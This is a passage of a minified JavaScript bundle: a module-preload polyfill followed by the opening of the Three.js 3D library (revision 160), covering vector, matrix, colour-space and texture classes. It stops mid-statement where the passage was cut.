(function(){const t=document.createElement("link").relList;if(t&&t.supports&&t.supports("modulepreload"))return;for(const r of document.querySelectorAll('link[rel="modulepreload"]'))n(r);new MutationObserver(r=>{for(const s of r)if(s.type==="childList")for(const o of s.addedNodes)o.tagName==="LINK"&&o.rel==="modulepreload"&&n(o)}).observe(document,{childList:!0,subtree:!0});function e(r){const s={};return r.integrity&&(s.integrity=r.integrity),r.referrerPolicy&&(s.referrerPolicy=r.referrerPolicy),r.crossOrigin==="use-credentials"?s.credentials="include":r.crossOrigin==="anonymous"?s.credentials="omit":s.credentials="same-origin",s}function n(r){if(r.ep)return;r.ep=!0;const s=e(r);fetch(r.href,s)}})();/**
 * @license
 * Copyright 2010-2023 Three.js Authors
 * SPDX-License-Identifier: MIT
 */const ss="160",Go=0,Es=1,Ho=2,to=1,Vo=2,$e=3,cn=0,Ee=1,Oe=2,an=0,Yn=1,ys=2,Ms=3,Ss=4,Wo=5,vn=100,Xo=101,qo=102,bs=103,Ts=104,Yo=200,jo=201,$o=202,Ko=203,Yr=204,jr=205,Zo=206,Jo=207,Qo=208,tl=209,el=210,nl=211,il=212,rl=213,sl=214,al=0,ol=1,ll=2,Yi=3,cl=4,dl=5,ul=6,pl=7,eo=0,fl=1,hl=2,on=0,ml=1,_l=2,gl=3,vl=4,xl=5,El=6,no=300,$n=301,Kn=302,$r=303,Kr=304,er=306,Zr=1e3,Fe=1001,Jr=1002,ge=1003,As=1004,dr=1005,we=1006,yl=1007,fi=1008,ln=1009,Ml=1010,Sl=1011,as=1012,io=1013,rn=1014,sn=1015,hi=1016,ro=1017,so=1018,yn=1020,bl=1021,ke=1023,Tl=1024,Al=1025,Mn=1026,Zn=1027,Rl=1028,ao=1029,wl=1030,oo=1031,lo=1033,ur=33776,pr=33777,fr=33778,hr=33779,Rs=35840,ws=35841,Cs=35842,Ps=35843,co=36196,Is=37492,Ls=37496,Ds=37808,Ns=37809,Us=37810,Os=37811,Fs=37812,ks=37813,Bs=37814,zs=37815,Gs=37816,Hs=37817,Vs=37818,Ws=37819,Xs=37820,qs=37821,mr=36492,Ys=36494,js=36495,Cl=36283,$s=36284,Ks=36285,Zs=36286,uo=3e3,Sn=3001,Pl=3200,Il=3201,Ll=0,Dl=1,Pe="",le="srgb",Ze="srgb-linear",os="display-p3",nr="display-p3-linear",ji="linear",jt="srgb",$i="rec709",Ki="p3",wn=7680,Js=519,Nl=512,Ul=513,Ol=514,po=515,Fl=516,kl=517,Bl=518,zl=519,Qs=35044,ta="300 es",Qr=1035,Ke=2e3,Zi=2001;class Qn{addEventListener(t,e){this._listeners===void 0&&(this._listeners={});const n=this._listeners;n[t]===void 0&&(n[t]=[]),n[t].indexOf(e)===-1&&n[t].push(e)}hasEventListener(t,e){if(this._listeners===void 0)return!1;const n=this._listeners;return n[t]!==void 0&&n[t].indexOf(e)!==-1}removeEventListener(t,e){if(this._listeners===void 0)return;const r=this._listeners[t];if(r!==void 0){const s=r.indexOf(e);s!==-1&&r.splice(s,1)}}dispatchEvent(t){if(this._listeners===void 0)return;const n=this._listeners[t.type];if(n!==void 0){t.target=this;const r=n.slice(0);for(let s=0,o=r.length;s<o;s++)r[s].call(this,t);t.target=null}}}const pe=["00","01","02","03","04","05","06","07","08","09","0a","0b","0c","0d","0e","0f","10","11","12","13","14","15","16","17","18","19","1a","1b","1c","1d","1e","1f","20","21","22","23","24","25","26","27","28","29","2a","2b","2c","2d","2e","2f","30","31","32","33","34","35","36","37","38","39","3a","3b","3c","3d","3e","3f","40","41","42","43","44","45","46","47","48","49","4a","4b","4c","4d","4e","4f","50","51","52","53","54","55","56","57","58","59","5a","5b","5c","5d","5e","5f","60","61","62","63","64","65","66","67","68","69","6a","6b","6c","6d","6e","6f","70","71","72","73","74","75","76","77","78","79","7a","7b","7c","7d","7e","7f","80","81","82","83","84","85","86","87","88","89","8a","8b","8c","8d","8e","8f","90","91","92","93","94","95","96","97","98","99","9a","9b","9c","9d","9e","9f","a0","a1","a2","a3","a4","a5","a6","a7","a8","a9","aa","ab","ac","ad","ae","af","b0","b1","b2","b3","b4","b5","b6","b7","b8","b9","ba","bb","bc","bd","be","bf","c0","c1","c2","c3","c4","c5","c6","c7","c8","c9","ca","cb","cc","cd","ce","cf","d0","d1","d2","d3","d4","d5","d6","d7","d8","d9","da","db","dc","dd","de","df","e0","e1","e2","e3","e4","e5","e6","e7","e8","e9","ea","eb","ec","ed","ee","ef","f0","f1","f2","f3","f4","f5","f6","f7","f8","f9","fa","fb","fc","fd","fe","ff"],_r=Math.PI/180,ts=180/Math.PI;function mi(){const i=Math.random()*4294967295|0,t=Math.random()*4294967295|0,e=Math.random()*4294967295|0,n=Math.random()*4294967295|0;return(pe[i&255]+pe[i>>8&255]+pe[i>>16&255]+pe[i>>24&255]+"-"+pe[t&255]+pe[t>>8&255]+"-"+pe[t>>16&15|64]+pe[t>>24&255]+"-"+pe[e&63|128]+pe[e>>8&255]+"-"+pe[e>>16&255]+pe[e>>24&255]+pe[n&255]+pe[n>>8&255]+pe[n>>16&255]+pe[n>>24&255]).toLowerCase()}function xe(i,t,e){return Math.max(t,Math.min(e,i))}function Gl(i,t){return(i%t+t)%t}function gr(i,t,e){return(1-e)*i+e*t}function ea(i){return(i&i-1)===0&&i!==0}function es(i){return Math.pow(2,Math.floor(Math.log(i)/Math.LN2))}function ii(i,t){switch(t.constructor){case Float32Array:return i;case Uint32Array:return i/4294967295;case Uint16Array:return i/65535;case Uint8Array:return i/255;case Int32Array:return Math.max(i/2147483647,-1);case Int16Array:return Math.max(i/32767,-1);case Int8Array:return Math.max(i/127,-1);default:throw new Error("Invalid component type.")}}function ve(i,t){switch(t.constructor){case Float32Array:return i;case Uint32Array:return Math.round(i*4294967295);case Uint16Array:return Math.round(i*65535);case Uint8Array:return Math.round(i*255);case Int32Array:return Math.round(i*2147483647);case Int16Array:return Math.round(i*32767);case Int8Array:return Math.round(i*127);default:throw new Error("Invalid component type.")}}class zt{constructor(t=0,e=0){zt.prototype.isVector2=!0,this.x=t,this.y=e}get width(){return this.x}set width(t){this.x=t}get height(){return this.y}set height(t){this.y=t}set(t,e){return this.x=t,this.y=e,this}setScalar(t){return this.x=t,this.y=t,this}setX(t){return this.x=t,this}setY(t){return this.y=t,this}setComponent(t,e){switch(t){case 0:this.x=e;break;case 1:this.y=e;break;default:throw new Error("index is out of range: "+t)}return this}getComponent(t){switch(t){case 0:return this.x;case 1:return this.y;default:throw new Error("index is out of range: "+t)}}clone(){return new this.constructor(this.x,this.y)}copy(t){return this.x=t.x,this.y=t.y,this}add(t){return this.x+=t.x,this.y+=t.y,this}addScalar(t){return this.x+=t,this.y+=t,this}addVectors(t,e){return this.x=t.x+e.x,this.y=t.y+e.y,this}addScaledVector(t,e){return this.x+=t.x*e,this.y+=t.y*e,this}sub(t){return this.x-=t.x,this.y-=t.y,this}subScalar(t){return this.x-=t,this.y-=t,this}subVectors(t,e){return this.x=t.x-e.x,this.y=t.y-e.y,this}multiply(t){return this.x*=t.x,this.y*=t.y,this}multiplyScalar(t){return this.x*=t,this.y*=t,this}divide(t){return this.x/=t.x,this.y/=t.y,this}divideScalar(t){return this.multiplyScalar(1/t)}applyMatrix3(t){const e=this.x,n=this.y,r=t.elements;return this.x=r[0]*e+r[3]*n+r[6],this.y=r[1]*e+r[4]*n+r[7],this}min(t){return this.x=Math.min(this.x,t.x),this.y=Math.min(this.y,t.y),this}max(t){return this.x=Math.max(this.x,t.x),this.y=Math.max(this.y,t.y),this}clamp(t,e){return this.x=Math.max(t.x,Math.min(e.x,this.x)),this.y=Math.max(t.y,Math.min(e.y,this.y)),this}clampScalar(t,e){return this.x=Math.max(t,Math.min(e,this.x)),this.y=Math.max(t,Math.min(e,this.y)),this}clampLength(t,e){const n=this.length();return this.divideScalar(n||1).multiplyScalar(Math.max(t,Math.min(e,n)))}floor(){return this.x=Math.floor(this.x),this.y=Math.floor(this.y),this}ceil(){return this.x=Math.ceil(this.x),this.y=Math.ceil(this.y),this}round(){return this.x=Math.round(this.x),this.y=Math.round(this.y),this}roundToZero(){return this.x=Math.trunc(this.x),this.y=Math.trunc(this.y),this}negate(){return this.x=-this.x,this.y=-this.y,this}dot(t){return this.x*t.x+this.y*t.y}cross(t){return this.x*t.y-this.y*t.x}lengthSq(){return this.x*this.x+this.y*this.y}length(){return Math.sqrt(this.x*this.x+this.y*this.y)}manhattanLength(){return Math.abs(this.x)+Math.abs(this.y)}normalize(){return this.divideScalar(this.length()||1)}angle(){return Math.atan2(-this.y,-this.x)+Math.PI}angleTo(t){const e=Math.sqrt(this.lengthSq()*t.lengthSq());if(e===0)return Math.PI/2;const n=this.dot(t)/e;return Math.acos(xe(n,-1,1))}distanceTo(t){return Math.sqrt(this.distanceToSquared(t))}distanceToSquared(t){const e=this.x-t.x,n=this.y-t.y;return e*e+n*n}manhattanDistanceTo(t){return Math.abs(this.x-t.x)+Math.abs(this.y-t.y)}setLength(t){return this.normalize().multiplyScalar(t)}lerp(t,e){return this.x+=(t.x-this.x)*e,this.y+=(t.y-this.y)*e,this}lerpVectors(t,e,n){return this.x=t.x+(e.x-t.x)*n,this.y=t.y+(e.y-t.y)*n,this}equals(t){return t.x===this.x&&t.y===this.y}fromArray(t,e=0){return this.x=t[e],this.y=t[e+1],this}toArray(t=[],e=0){return t[e]=this.x,t[e+1]=this.y,t}fromBufferAttribute(t,e){return this.x=t.getX(e),this.y=t.getY(e),this}rotateAround(t,e){const n=Math.cos(e),r=Math.sin(e),s=this.x-t.x,o=this.y-t.y;return this.x=s*n-o*r+t.x,this.y=s*r+o*n+t.y,this}random(){return this.x=Math.random(),this.y=Math.random(),this}*[Symbol.iterator](){yield this.x,yield this.y}}class kt{constructor(t,e,n,r,s,o,a,l,c){kt.prototype.isMatrix3=!0,this.elements=[1,0,0,0,1,0,0,0,1],t!==void 0&&this.set(t,e,n,r,s,o,a,l,c)}set(t,e,n,r,s,o,a,l,c){const u=this.elements;return u[0]=t,u[1]=r,u[2]=a,u[3]=e,u[4]=s,u[5]=l,u[6]=n,u[7]=o,u[8]=c,this}identity(){return this.set(1,0,0,0,1,0,0,0,1),this}copy(t){const e=this.elements,n=t.elements;return e[0]=n[0],e[1]=n[1],e[2]=n[2],e[3]=n[3],e[4]=n[4],e[5]=n[5],e[6]=n[6],e[7]=n[7],e[8]=n[8],this}extractBasis(t,e,n){return t.setFromMatrix3Column(this,0),e.setFromMatrix3Column(this,1),n.setFromMatrix3Column(this,2),this}setFromMatrix4(t){const e=t.elements;return this.set(e[0],e[4],e[8],e[1],e[5],e[9],e[2],e[6],e[10]),this}multiply(t){return this.multiplyMatrices(this,t)}premultiply(t){return this.multiplyMatrices(t,this)}multiplyMatrices(t,e){const n=t.elements,r=e.elements,s=this.elements,o=n[0],a=n[3],l=n[6],c=n[1],u=n[4],h=n[7],p=n[2],m=n[5],E=n[8],x=r[0],f=r[3],d=r[6],g=r[1],_=r[4],v=r[7],w=r[2],S=r[5],T=r[8];return s[0]=o*x+a*g+l*w,s[3]=o*f+a*_+l*S,s[6]=o*d+a*v+l*T,s[1]=c*x+u*g+h*w,s[4]=c*f+u*_+h*S,s[7]=c*d+u*v+h*T,s[2]=p*x+m*g+E*w,s[5]=p*f+m*_+E*S,s[8]=p*d+m*v+E*T,this}multiplyScalar(t){const e=this.elements;return e[0]*=t,e[3]*=t,e[6]*=t,e[1]*=t,e[4]*=t,e[7]*=t,e[2]*=t,e[5]*=t,e[8]*=t,this}determinant(){const t=this.elements,e=t[0],n=t[1],r=t[2],s=t[3],o=t[4],a=t[5],l=t[6],c=t[7],u=t[8];return e*o*u-e*a*c-n*s*u+n*a*l+r*s*c-r*o*l}invert(){const t=this.elements,e=t[0],n=t[1],r=t[2],s=t[3],o=t[4],a=t[5],l=t[6],c=t[7],u=t[8],h=u*o-a*c,p=a*l-u*s,m=c*s-o*l,E=e*h+n*p+r*m;if(E===0)return this.set(0,0,0,0,0,0,0,0,0);const x=1/E;return t[0]=h*x,t[1]=(r*c-u*n)*x,t[2]=(a*n-r*o)*x,t[3]=p*x,t[4]=(u*e-r*l)*x,t[5]=(r*s-a*e)*x,t[6]=m*x,t[7]=(n*l-c*e)*x,t[8]=(o*e-n*s)*x,this}transpose(){let t;const e=this.elements;return t=e[1],e[1]=e[3],e[3]=t,t=e[2],e[2]=e[6],e[6]=t,t=e[5],e[5]=e[7],e[7]=t,this}getNormalMatrix(t){return this.setFromMatrix4(t).invert().transpose()}transposeIntoArray(t){const e=this.elements;return t[0]=e[0],t[1]=e[3],t[2]=e[6],t[3]=e[1],t[4]=e[4],t[5]=e[7],t[6]=e[2],t[7]=e[5],t[8]=e[8],this}setUvTransform(t,e,n,r,s,o,a){const l=Math.cos(s),c=Math.sin(s);return this.set(n*l,n*c,-n*(l*o+c*a)+o+t,-r*c,r*l,-r*(-c*o+l*a)+a+e,0,0,1),this}scale(t,e){return this.premultiply(vr.makeScale(t,e)),this}rotate(t){return this.premultiply(vr.makeRotation(-t)),this}translate(t,e){return this.premultiply(vr.makeTranslation(t,e)),this}makeTranslation(t,e){return t.isVector2?this.set(1,0,t.x,0,1,t.y,0,0,1):this.set(1,0,t,0,1,e,0,0,1),this}makeRotation(t){const e=Math.cos(t),n=Math.sin(t);return this.set(e,-n,0,n,e,0,0,0,1),this}makeScale(t,e){return this.set(t,0,0,0,e,0,0,0,1),this}equals(t){const e=this.elements,n=t.elements;for(let r=0;r<9;r++)if(e[r]!==n[r])return!1;return!0}fromArray(t,e=0){for(let n=0;n<9;n++)this.elements[n]=t[n+e];return this}toArray(t=[],e=0){const n=this.elements;return t[e]=n[0],t[e+1]=n[1],t[e+2]=n[2],t[e+3]=n[3],t[e+4]=n[4],t[e+5]=n[5],t[e+6]=n[6],t[e+7]=n[7],t[e+8]=n[8],t}clone(){return new this.constructor().fromArray(this.elements)}}const vr=new kt;function fo(i){for(let t=i.length-1;t>=0;--t)if(i[t]>=65535)return!0;return!1}function Ji(i){return document.createElementNS("http://www.w3.org/1999/xhtml",i)}function Hl(){const i=Ji("canvas");return i.style.display="block",i}const na={};function ui(i){i in na||(na[i]=!0,console.warn(i))}const ia=new kt().set(.8224621,.177538,0,.0331941,.9668058,0,.0170827,.0723974,.9105199),ra=new kt().set(1.2249401,-.2249404,0,-.0420569,1.0420571,0,-.0196376,-.0786361,1.0982735),yi={[Ze]:{transfer:ji,primaries:$i,toReference:i=>i,fromReference:i=>i},[le]:{transfer:jt,primaries:$i,toReference:i=>i.convertSRGBToLinear(),fromReference:i=>i.convertLinearToSRGB()},[nr]:{transfer:ji,primaries:Ki,toReference:i=>i.applyMatrix3(ra),fromReference:i=>i.applyMatrix3(ia)},[os]:{transfer:jt,primaries:Ki,toReference:i=>i.convertSRGBToLinear().applyMatrix3(ra),fromReference:i=>i.applyMatrix3(ia).convertLinearToSRGB()}},Vl=new Set([Ze,nr]),Wt={enabled:!0,_workingColorSpace:Ze,get workingColorSpace(){return this._workingColorSpace},set workingColorSpace(i){if(!Vl.has(i))throw new Error(`Unsupported working color space, "${i}".`);this._workingColorSpace=i},convert:function(i,t,e){if(this.enabled===!1||t===e||!t||!e)return i;const n=yi[t].toReference,r=yi[e].fromReference;return r(n(i))},fromWorkingColorSpace:function(i,t){return this.convert(i,this._workingColorSpace,t)},toWorkingColorSpace:function(i,t){return this.convert(i,t,this._workingColorSpace)},getPrimaries:function(i){return yi[i].primaries},getTransfer:function(i){return i===Pe?ji:yi[i].transfer}};function jn(i){return i<.04045?i*.0773993808:Math.pow(i*.9478672986+.0521327014,2.4)}function xr(i){return i<.0031308?i*12.92:1.055*Math.pow(i,.41666)-.055}let Cn;class ho{static getDataURL(t){if(/^data:/i.test(t.src)||typeof HTMLCanvasElement>"u")return t.src;let e;if(t instanceof HTMLCanvasElement)e=t;else{Cn===void 0&&(Cn=Ji("canvas")),Cn.width=t.width,Cn.height=t.height;const n=Cn.getContext("2d");t instanceof ImageData?n.putImageData(t,0,0):n.drawImage(t,0,0,t.width,t.height),e=Cn}return e.width>2048||e.height>2048?(console.warn("THREE.ImageUtils.getDataURL: Image converted to jpg for performance reasons",t),e.toDataURL("image/jpeg",.6)):e.toDataURL("image/png")}static sRGBToLinear(t){if(typeof HTMLImageElement<"u"&&t instanceof HTMLImageElement||typeof HTMLCanvasElement<"u"&&t instanceof HTMLCanvasElement||typeof ImageBitmap<"u"&&t instanceof ImageBitmap){const e=Ji("canvas");e.width=t.width,e.height=t.height;const n=e.getContext("2d");n.drawImage(t,0,0,t.width,t.height);const r=n.getImageData(0,0,t.width,t.height),s=r.data;for(let o=0;o<s.length;o++)s[o]=jn(s[o]/255)*255;return n.putImageData(r,0,0),e}else if(t.data){const e=t.data.slice(0);for(let n=0;n<e.length;n++)e instanceof Uint8Array||e instanceof Uint8ClampedArray?e[n]=Math.floor(jn(e[n]/255)*255):e[n]=jn(e[n]);return{data:e,width:t.width,height:t.height}}else return console.warn("THREE.ImageUtils.sRGBToLinear(): Unsupported image type. No color space conversion applied."),t}}let Wl=0;class mo{constructor(t=null){this.isSource=!0,Object.defineProperty(this,"id",{value:Wl++}),this.uuid=mi(),this.data=t,this.version=0}set needsUpdate(t){t===!0&&this.version++}toJSON(t){const e=t===void 0||typeof t=="string";if(!e&&t.images[this.uuid]!==void 0)return t.images[this.uuid];const n={uuid:this.uuid,url:""},r=this.data;if(r!==null){let s;if(Array.isArray(r)){s=[];for(let o=0,a=r.length;o<a;o++)r[o].isDataTexture?s.push(Er(r[o].image)):s.push(Er(r[o]))}else s=Er(r);n.url=s}return e||(t.images[this.uuid]=n),n}}function Er(i){return typeof HTMLImageElement<"u"&&i instanceof HTMLImageElement||typeof HTMLCanvasElement<"u"&&i instanceof HTMLCanvasElement||typeof ImageBitmap<"u"&&i instanceof ImageBitmap?ho.getDataURL(i):i.data?{data:Array.from(i.data),width:i.width,height:i.height,type:i.data.constructor.name}:(console.warn("THREE.Texture: Unable to serialize Texture."),{})}let Xl=0;class Te extends Qn{constructor(t=Te.DEFAULT_IMAGE,e=Te.DEFAULT_MAPPING,n=Fe,r=Fe,s=we,o=fi,a=ke,l=ln,c=Te.DEFAULT_ANISOTROPY,u=Pe){super(),this.isTexture=!0,Object.defineProperty(this,"id",{value:Xl++}),this.uuid=mi(),this.name="",this.source=new mo(t),this.mipmaps=[],this.mapping=e,this.channel=0,this.wrapS=n,this.wrapT=r,this.magFilter=s,this.minFilter=o,this.anisotropy=c,this.format=a,this.internalFormat=null,this.type=l,this.offset=new zt(0,0),this.repeat=new zt(1,1),this.center=new zt(0,0),this.rotation=0,this.matrixAutoUpdate=!0,this.matrix=new kt,this.generateMipmaps=!0,this.premultiplyAlpha=!1,this.flipY=!0,this.unpackAlignment=4,typeof u=="string"?this.colorSpace=u:(ui("THREE.Texture: Property .encoding has been replaced by .colorSpace."),this.colorSpace=u===Sn?le:Pe),this.userData={},this.version=0,this.onUpdate=null,this.isRenderTargetTexture=!1,this.needsPMREMUpdate=!1}get image(){return this.source.data}set image(t=null){this.source.data=t}updateMatrix(){this.matrix.setUvTransform(this.offset.x,this.offset.y,this.repeat.x,this.repeat.y,this.rotation,this.center.x,this.center.y)}clone(){return new this.constructor().copy(this)}copy(t){return this.name=t.name,this.source=t.source,this.mipmaps=t.mipmaps.slice(0),this.mapping=t.mapping,this.channel=t.channel,this.wrapS=t.wrapS,this.wrapT=t.wrapT,this.magFilter=t.magFilter,this.minFilter=t.minFilter,this.anisotropy=t.anisotropy,this.format=t.format,this.internalFormat=t.internalFormat,this.type=t.type,this.offset.copy(t.offset),this.repeat.copy(t.repeat),this.center.copy(t.center),this.rotation=t.rotation,this.matrixAutoUpdate=t.matrixAutoUpdate,this.matrix.copy(t.matrix),this.generateMipmaps=t.generateMipmaps,this.premultiplyAlpha=t.premultiplyAlpha,this.flipY=t.flipY,this.unpackAlignment=t.unpackAlignment,this.colorSpace=t.colorSpace,this.userData=JSON.parse(JSON.stringify(t.userData)),this.needsUpdate=!0,this}toJSON(t){const e=t===void 0||typeof t=="string";if(!e&&t.textures[this.uuid]!==void 0)return t.textures[this.uuid];const n={metadata:{version:4.6,type:"Texture",generator:"Texture.toJSON"},uuid:this.uuid,name:this.name,image:this.source.toJSON(t).uuid,mapping:this.mapping,channel:this.channel,repeat:[this.repeat.x,this.repeat.y],offset:[this.offset.x,this.offset.y],center:[this.center.x,this.center.y],rotation:this.rotation,wrap:[this.wrapS,this.wrapT],format:this.format,internalFormat:this.internalFormat,type:this.type,colorSpace:this.colorSpace,minFilter:this.minFilter,magFilter:this.magFilter,anisotropy:this.anisotropy,flipY:this.flipY,generateMipmaps:this.generateMipmaps,premultiplyAlpha:this.premultiplyAlpha,unpackAlignment:this.unpackAlignment};return Object.keys(this.userData).length>0&&(n.userData=this.userData),e||(t.textures[this.uuid]=n),n}dispose(){this.dispatchEvent({type:"dispose"})}transformUv(t){if(this.mapping!==no)return t;if(t.applyMatrix3(this.matrix),t.x<0||t.x>1)switch(this.wrapS){case Zr:t.x=t.x-Math.floor(t.x);break;case Fe:t.x=t.x<0?0:1;break;case Jr:Math.abs(Math.floor(t.x)%2)===1?t.x=Math.ceil(t.x)-t.x:t.x=t.x-Math.floor(t.x);break}if(t.y<0||t.y>1)switch(this.wrapT){case Zr:t.y=t.y-Math.floor(t.y);break;case Fe:t.y=t.y<0?0:1;break;case Jr:Math.abs(Math.floor(t.y)%2)===1?t.y=Math.ceil(t.y)-t.y:t.y=t.y-Math.floor(t.y);break}return this.flipY&&(t.y=1-t.y),t}set needsUpdate(t){t===!0&&(this.version++,this.source.needsUpdate=!0)}get encoding(){return ui("THREE.Texture: Property .encoding has been replaced by .colorSpace."),this.colorSpace===le?Sn:uo}set encoding(t){ui("THREE.Texture: Property .encoding has been replaced by .colorSpace."),this.colorSpace=t===Sn?le:Pe}}Te.DEFAULT_IMAGE=null;Te.DEFAULT_MAPPING=no;Te.DEFAULT_ANISOTROPY=1;class ce{constructor(t=0,e=0,n=0,r=1){ce.prototype.isVector4=!0,this.x=t,this.y=e,this.z=n,this.w=r}get width(){return this.z}set width(t){this.z=t}get height(){return this.w}set height(t){this.w=t}set(t,e,n,r){return this.x=t,this.y=e,this.z=n,this.w=r,this}setScalar(t){return this.x=t,this.y=t,this.z=t,this.w=t,this}setX(t){return this.x=t,this}setY(t){return this.y=t,this}setZ(t){return this.z=t,this}setW(t){return this.w=t,this}setComponent(t,e){switch(t){case 0:this.x=e;break;case 1:this.y=e;break;case 2:this.z=e;break;case 3:this.w=e;break;default:throw new Error("index is out of range: "+t)}return this}getComponent(t){switch(t){case 0:return this.x;case 1:return this.y;case 2:return this.z;case 3:return this.w;default:throw new Error("index is out of range: "+t)}}clone(){return new this.constructor(this.x,this.y,this.z,this.w)}copy(t){return this.x=t.x,this.y=t.y,this.z=t.z,this.w=t.w!==void 0?t.w:1,this}add(t){return this.x+=t.x,this.y+=t.y,this.z+=t.z,this.w+=t.w,this}addScalar(t){return this.x+=t,this.y+=t,this.z+=t,this.w+=t,this}addVectors(t,e){return this.x=t.x+e.x,this.y=t.y+e.y,this.z=t.z+e.z,this.w=t.w+e.w,this}addScaledVector(t,e){return this.x+=t.x*e,this.y+=t.y*e,this.z+=t.z*e,this.w+=t.w*e,this}sub(t){return this.x-=t.x,this.y-=t.y,this.z-=t.z,this.w-=t.w,this}subScalar(t){return this.x-=t,this.y-=t,this.z-=t,this.w-=t,this}subVectors(t,e){return this.x=t.x-e.x,this.y=t.y-e.y,this.z=t.z-e.z,this.w=t.w-e.w,this}multiply(t){return this.x*=t.x,this.y*=t.y,this.z*=t.z,this.w*=t.w,this}multiplyScalar(t){return this.x*=t,this.y*=t,this.z*=t,this.w*=t,this}applyMatrix4(t){const e=this.x,n=this.y,r=this.z,s=this.w,o=t.elements;return this.x=o[0]*e+o[4]*n+o[8]*r+o[12]*s,this.y=o[1]*e+o[5]*n+o[9]*r+o[13]*s,this.z=o[2]*e+o[6]*n+o[10]*r+o[14]*s,this.w=o[3]*e+o[7]*n+o[11]*r+o[15]*s,this}divideScalar(t){return this.multiplyScalar(1/t)}setAxisAngleFromQuaternion(t){this.w=2*Math.acos(t.w);const e=Math.sqrt(1-t.w*t.w);return e<1e-4?(this.x=1,this.y=0,this.z=0):(this.x=t.x/e,this.y=t.y/e,this.z=t.z/e),this}setAxisAngleFromRotationMatrix(t){let e,n,r,s;const l=t.elements,c=l[0],u=l[4],h=l[8],p=l[1],m=l[5],E=l[9],x=l[2],f=l[6],d=l[10];if(Math.abs(u-p)<.01&&Math.abs(h-x)<.01&&Math.abs(E-f)<.01){if(Math.abs(u+p)<.1&&Math.abs(h+x)<.1&&Math.abs(E+f)<.1&&Math.abs(c+m+d-3)<.1)return this.set(1,0,0,0),this;e=Math.PI;const _=(c+1)/2,v=(m+1)/2,w=(d+1)/2,S=(u+p)/4,T=(h+x)/4,D=(E+f)/4;return _>v&&_>w?_<.01?(n=0,r=.707106781,s=.707106781):(n=Math.sqrt(_),r=S/n,s=T/n):v>w?v<.01?(n=.707106781,r=0,s=.707106781):(r=Math.sqrt(v),n=S/r,s=D/r):w<.01?(n=.707106781,r=.707106781,s=0):(s=Math.sqrt(w),n=T/s,r=D/s),this.set(n,r,s,e),this}let g=Math.sqrt((f-E)*(f-E)+(h-x)*(h-x)+(p-u)*(p-u));return Math.abs(g)<.001&&(g=1),this.x=(f-E)/g,this.y=(h-x)/g,this.z=(p-u)/g,this.w=Math.acos((c+m+d-1)/2),this}min(t){return this.x=Math.min(this.x,t.x),this.y=Math.min(this.y,t.y),this.z=Math.min(this.z,t.z),this.w=Math.min(this.w,t.w),this}max(t){return this.x=Math.max(this.x,t.x),this.y=Math.max(this.y,t.y),this.z=Math.max(this.z,t.z),this.w=Math.max(this.w,t.w),this}clamp(t,e){return this.x=Math.max(t.x,Math.min(e.x,this.x)),this.y=Math.max(t.y,Math.min(e.y,this.y)),this.z=Math.max(t.z,Math.min(e.z,this.z)),this.w=Math.max(t.w,Math.min(e.w,this.w)),this}clampScalar(t,e){return this.x=Math.max(t,Math.min(e,this.x)),this.y=Math.max(t,Math.min(e,this.y)),this.z=Math.max(t,Math.min(e,this.z)),this.w=Math.max(t,Math.min(e,this.w)),this}clampLength(t,e){const n=this.length();return this.divideScalar(n||1).multiplyScalar(Math.max(t,Math.min(e,n)))}floor(){return this.x=Math.floor(this.x),this.y=Math.floor(this.y),this.z=Math.floor(this.z),this.w=Math.floor(this.w),this}ceil(){return this.x=Math.ceil(this.x),this.y=Math.ceil(this.y),this.z=Math.ceil(this.z),this.w=Math.ceil(this.w),this}round(){return this.x=Math.round(this.x),this.y=Math.round(this.y),this.z=Math.round(this.z),this.w=Math.round(this.w),this}roundToZero(){return this.x=Math.trunc(this.x),this.y=Math.trunc(this.y),this.z=Math.trunc(this.z),this.w=Math.trunc(this.w),this}negate(){return this.x=-this.x,this.y=-this.y,this.z=-this.z,this.w=-this.w,this}dot(t){return this.x*t.x+this.y*t.y+this.z*t.z+this.w*t.w}lengthSq(){return this.x*this.x+this.y*this.y+this.z*this.z+this.w*this.w}length(){return Math.sqrt(this.x*this.x+this.y*this.y+this.z*this.z+this.w*this.w)}manhattanLength(){return Math.abs(this.x)+Math.abs(this.y)+Math.abs(this.z)+Math.abs(this.w)}normalize(){return this.divideScalar(this.length()||1)}setLength(t){return this.normalize().multiplyScalar(t)}lerp(t,e){return this.x+=(t.x-this.x)*e,this.y+=(t.y-this.y)*e,this.z+=(t.z-this.z)*e,this.w+=(t.w-this.w)*e,this}lerpVectors(t,e,n){return this.x=t.x+(e.x-t.x)*n,this.y=t.y+(e.y-t.y)*n,this.z=t.z+(e.z-t.z)*n,this.w=t.w+(e.w-t.w)*n,this}equals(t){return t.x===this.x&&t.y===this.y&&t.z===this.z&&t.w===this.w}fromArray(t,e=0){return this.x=t[e],this.y=t[e+1],this.z=t[e+2],this.w=t[e+3],this}toArray(t=[],e=0){return t[e]=this.x,t[e+1]=this.y,t[e+2]=this.z,t[e+3]=this.w,t}fromBufferAttribute(t,e){return this.x=t.getX(e),this.y=t.getY(e),this.z=t.getZ(e),this.w=t.getW(e),this}random(){return this.x=Math.random(),this.y=Math.random(),this.z=Math.random(),this.w=Math.random(),this}*[Symbol.iterator](){yield this.x,yield this.y,yield this.z,yield this.w}}class ql extends Qn{constructor(t=1,e=1,n={}){super(),this.isRenderTarget=!0,this.width=t,this.height=e,this.depth=1,this.scissor=new ce(0,0,t,e),this.scissorTest=!1,this.viewport=new ce(0,0,t,e);const r={width:t,height:e,depth:1};n.encoding!==void 0&&(ui("THREE.WebGLRenderTarget: option.encoding has been replaced by option.colorSpace."),n.colorSpace=n.encoding===Sn?le:Pe),n=Object.assign({generateMipmaps:!1,internalFormat:null,minFilter:we,depthBuffer:!0,stencilBuffer:!1,depthTexture:null,samples:0},n),this.texture=new Te(r,n.mapping,n.wrapS,n.wrapT,n.magFilter,n.minFilter,n.format,n.type,n.anisotropy,n.colorSpace),this.texture.isRenderTargetTexture=!0,this.texture.flipY=!1,this.texture.generateMipmaps=n.generateMipmaps,this.texture.internalFormat=n.internalFormat,this.depthBuffer=n.depthBuffer,this.stencilBuffer=n.stencilBuffer,this.depthTexture=n.depthTexture,this.samples=n.samples}setSize(t,e,n=1){(this.width!==t||this.height!==e||this.depth!==n)&&(this.width=t,this.height=e,this.depth=n,this.texture.image.width=t,this.texture.image.height=e,this.texture.image.depth=n,this.dispose()),this.viewport.set(0,0,t,e),this.scissor.set(0,0,t,e)}clone(){return new 